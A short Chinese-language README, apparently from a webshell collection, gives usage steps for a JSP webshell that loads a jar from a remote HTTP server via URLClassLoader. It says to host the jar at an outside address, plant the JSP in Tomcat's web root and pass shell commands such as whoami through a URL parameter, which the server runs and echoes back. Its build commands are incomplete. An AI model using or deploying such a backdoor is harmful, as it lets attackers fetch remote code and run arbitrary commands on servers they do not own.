### URLClassLoader加载远程jar的JSP Webshell

编译打包jar：
```
javac Threedr3am_3.class
jar -cvf 
```

使用：
```
1.把threedr3am.jar放到可被访问的HTTP服务器，例：http://1.1.1.1:23232/threedr3am.jar

2.修改threedr3am.jar加载jar的url

3.把jsp文件放到能被解析的服务器目录，例：tomcat的webapps/ROOT

4.在浏览器访问4.jsp，并使用参数threedr3am传入需要远程执行的命令，例：http://127.0.0.1:8080/4.jsp?threedr3am=whoami

5.服务器将会执行相应的shell命令，最后回显
```